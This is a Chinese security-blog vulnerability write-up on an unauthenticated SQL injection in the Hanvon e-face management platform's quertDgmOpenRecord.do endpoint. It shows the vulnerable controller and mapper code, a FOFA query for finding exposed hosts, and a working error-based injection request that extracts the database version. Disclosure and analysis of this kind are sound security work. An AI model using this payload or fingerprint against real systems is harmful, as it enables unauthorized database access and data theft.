---
title: "汉王e脸通综合管理平台 quertDgmOpenRecord.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-quertDgmOpenRecord-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-quertdgmopenrecord.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 quertDgmOpenRecord.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/30 12:29
* 873浏览
* [0评论](#comment)
* 40分钟阅读

深入探索

SQL注入检测工具

企业安全咨询

数据库


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `quertDgmOpenRecord.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

文件大小转换

技术文章订阅

在线安全工具

直接看 `DgmOpenRecordController` 里关于 `quertDgmOpenRecord` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/quertDgmOpenRecord.do"},
        method = {RequestMethod.GET}
    )
    public RequestJson quertDgmOpenRecord(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "openType") String openType, @RequestParam(required = false,value = "userName") String userName, @RequestParam(required = false,value = "deviceName") String deviceName, @RequestParam(required = false,value = "start") String start, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
        RequestJson result = new RequestJson();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            DgmOpenRecordParam param = new DgmOpenRecordParam();
            param.setOpenType(openType);
            param.setUserName(userName);
            param.setDeviceName(deviceName);
            if (start != null || end != null) {
                param.setStart(DateUtils.formatStrToDate(start));
                param.setEnd(DateUtils.formatStrToDate(end));
            }

            param.setColumnKey(columnKey);
            param.setOrder(order);
            PageHelper.startPage(page, pageSize);
            List<DgmOpenRecord> list = this.dgmOpenRecordAsm.quertDgmOpenRecord(param);
```

跟进`quertDgmOpenRecord`方法

```
List<DgmOpenRecord> quertDgmOpenRecord(@Param("param") DgmOpenRecordParam var1);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 DgmOpenRecordDsm.xml

代码安全审计

```
<select id="quertDgmOpenRecord" parameterType="com.hanvon.iface.tpm.telPo.param.DgmOpenRecordParam" resultMap="BaseResultMap">
    SELECT DOR.ID, DOR.OPEN_TYPE, DOR.USER_ID, DOR.USER_NAME, DOR.USER_DEPARTMENT_NAME, DOR.USER_IDCARD, DOR.USER_TYPE,
    DOR.DEVICE_SN, DOR.DEVICE_NAME, DOR.DEVICE_ADDRESS, DOR.CARD_SN, DOR.CAPTURE_PHOTO, DOR.OPENTIME, DOR.MEMO, DOR.DEVICE_NUMBER,
    CALL_TIME
    FROM DGM_OPEN_RECORD DOR
    WHERE 1 = 1
    <if test="param.start != null and param.end != null">
      AND DOR.OPENTIME BETWEEN #{param.start} AND #{param.end}
    </if>
    <if test="param.userName != null">
      AND DOR.USER_NAME like CONCAT('%',#{param.userName},'%')
    </if>
    <if test="param.deviceName != null">
      AND DOR.DEVICE_NAME like CONCAT('%',#{param.deviceName},'%')
    </if>
    <if test="param.openType != null">
      AND DOR.OPEN_TYPE = #{param.openType}
    </if>
    <if test="param.userId != null">
      AND DOR.USER_ID = #{param.userId}
    </if>
    ORDER BY
    <if test="param.order == null or param.order == ''">
      DOR.OPENTIME desc
    </if>
    <if test="param.order != null and param.order != ''">
      ${param.columnKey} ${param.order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/dgmOpenRecord/quertDgmOpenRecord.do?branchId=1&columnKey=&deviceName=test&id=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357))&page=1&pageSize=10&recoToken=SGUsqvF7cVS&type=1&start=2025-03-25&end=2025-03-25 HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 quertDgmOpenRecord.do SQL注入漏洞](images/img-001-dd145d93974b.webp)](https://image.mrxn.net/74e150cb841b4284a109feaaf2ff20f0.webp)

成功利用报错注入获取到数据库版本号信息

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 quertDgmOpenRecord.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-quertDgmOpenRecord-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-quertDgmOpenRecord-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-quertDgmOpenRecord-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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